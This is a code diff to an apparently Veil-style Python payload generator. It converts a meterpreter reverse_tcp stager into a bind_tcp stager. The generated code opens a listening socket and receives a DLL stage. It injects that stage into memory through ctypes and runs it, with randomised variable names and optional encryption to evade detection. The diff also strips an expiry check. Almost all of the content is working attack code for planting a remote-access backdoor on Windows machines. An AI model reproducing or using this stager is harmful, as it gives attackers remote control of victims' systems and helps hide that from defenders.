@@ -1,15 +1,11 @@
 """
 
-Custom-written pure python meterpreter/reverse_tcp stager.
-
-By @harmj0y
+Custom-written pure python meterpreter/bind_tcp stager.
 
 """
 
 from modules.common import helpers
 from modules.common import encryption
-from datetime import date
-from datetime import timedelta
 from modules.common.pythonpayload import PythonPayload
 
 class Payload(PythonPayload):
@@ -17,14 +13,13 @@ class Payload(PythonPayload):
     def __init__(self):
         PythonPayload.__init__(self)
         # required options
-        self.description = "pure windows/meterpreter/reverse_tcp stager, no shellcode"
+        self.description = "pure windows/meterpreter/bind_tcp stager, no shellcode"
         self.rating = "Excellent"
         
         # optional
         # options we require user interaction for- format is {Option : [Value, Description]]}
-        self.required_options["LHOST"] = ["", "IP of the metasploit handler"]
-        self.required_options["LPORT"] = ["4444", "Port of the metasploit handler"]
-        self.required_options["expire_payload"] = ["X", "Optional: Payloads expire after \"X\" days"]
+        self.required_options["RHOST"] = ["", "The listen target address"]
+        self.required_options["LPORT"] = ["4444", "The listen port"]
         
         
     def generate(self):
@@ -33,6 +28,7 @@ class Payload(PythonPayload):
         # randomize all of the variable names used
         shellCodeName = helpers.randomString()
         socketName = helpers.randomString()
+        clientSocketName = helpers.randomString()
         intervalName = helpers.randomString()
         attemptsName = helpers.randomString()
         getDataMethodName = helpers.randomString()
@@ -57,16 +53,19 @@ class Payload(PythonPayload):
         payloadCode += "def %s():\n" %(getDataMethodName)
         payloadCode += "\ttry:\n"
         payloadCode += "\t\tglobal %s\n" %(socketName)
+        payloadCode += "\t\tglobal %s\n" %(clientSocketName)
         # build the socket and connect to the handler
         payloadCode += "\t\t%s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n" %(socketName)
-        payloadCode += "\t\t%s.connect(('%s', %s))\n" %(socketName,self.required_options["LHOST"][0],self.required_options["LPORT"][0])
+        payloadCode += "\t\t%s.bind(('%s', %s))\n" %(socketName,self.required_options["RHOST"][0],self.required_options["LPORT"][0])
+        payloadCode += "\t\t%s.listen(1)\n" % (socketName)
+        payloadCode += "\t\t%s,_ = %s.accept()\n" % (clientSocketName, socketName)
         # pack the underlying socket file descriptor into a c structure
-        payloadCode += "\t\t%s = struct.pack('<i', %s.fileno())\n" % (fdBufName,socketName)
+        payloadCode += "\t\t%s = struct.pack('<i', %s.fileno())\n" % (fdBufName,clientSocketName)
         # unpack the length of the payload, received as a 4 byte array from the handler
-        payloadCode += "\t\tl = struct.unpack('<i', str(%s.recv(4)))[0]\n" %(socketName)
+        payloadCode += "\t\tl = struct.unpack('<i', str(%s.recv(4)))[0]\n" %(clientSocketName)
         payloadCode += "\t\t%s = \"     \"\n" % (rcvStringName)
         # receive ALL of the payload .dll data
-        payloadCode += "\t\twhile len(%s) < l: %s += %s.recv(l)\n" % (rcvStringName, rcvStringName, socketName)
+        payloadCode += "\t\twhile len(%s) < l: %s += %s.recv(l)\n" % (rcvStringName, rcvStringName, clientSocketName)
         payloadCode += "\t\t%s = ctypes.create_string_buffer(%s, len(%s))\n" % (rcvCStringName,rcvStringName,rcvStringName)
         # prepend a little assembly magic to push the socket fd into the edi register
         payloadCode += "\t\t%s[0] = binascii.unhexlify('BF')\n" %(rcvCStringName)
@@ -91,30 +90,10 @@ class Payload(PythonPayload):
         # wait for the .dll execution to finish
         payloadCode += "\t\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))\n"
 
-        # set up expiration options if specified
-        if self.required_options["expire_payload"][0].lower() == "x":
-            # download the stager
-            payloadCode += "%s = %s()\n" %(shellCodeName, getDataMethodName)
-            # inject what we grabbed
-            payloadCode += "%s(%s)\n" % (injectMethodName,shellCodeName)
-        else:
-            # Get our current date and add number of days to the date
-            todaysdate = date.today()
-            expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))
-                
-            randToday = helpers.randomString()
-            randExpire = helpers.randomString()
-
-            payloadCode += 'from datetime import datetime\n'
-            payloadCode += 'from datetime import date\n\n'
-            payloadCode += randToday + ' = datetime.now()\n'
-            payloadCode += randExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
-            payloadCode += 'if ' + randToday + ' < ' + randExpire + ':\n'
-            # download the stager
-            payloadCode += "\t%s = %s()\n" %(shellCodeName, getDataMethodName)
-            # inject what we grabbed
-            payloadCode += "\t%s(%s)\n" % (injectMethodName,shellCodeName)
-
+        # download the stager
+        payloadCode += "%s = %s()\n" %(shellCodeName, getDataMethodName)
+        # inject what we grabbed
+        payloadCode += "%s(%s)\n" % (injectMethodName,shellCodeName)
 
         if self.required_options["use_pyherion"][0].lower() == "y":
             payloadCode = encryption.pyherion(payloadCode)
